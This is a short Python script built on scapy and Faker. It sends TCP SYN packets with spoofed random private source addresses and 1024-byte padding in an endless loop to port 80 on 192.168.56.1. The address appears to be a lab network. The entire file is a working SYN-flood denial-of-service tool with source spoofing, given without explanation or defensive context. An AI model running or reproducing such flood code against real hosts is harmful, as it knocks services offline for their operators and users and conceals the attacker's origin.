import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) 
from scapy.all import *
from faker import Faker

conf.verb = 0

fake = Faker()

host = "192.168.56.1"
port = 80

packet_number = 0
  
packet_number += 1  
origenIP=fake.ipv4_private()
packet = scapy.all.IP(src= (origenIP), dst= host) / scapy.all.TCP(sport= RandShort(), dport= port, flags="S")/Raw(b"X"*1024)
send(packet, loop=1, verbose=0)    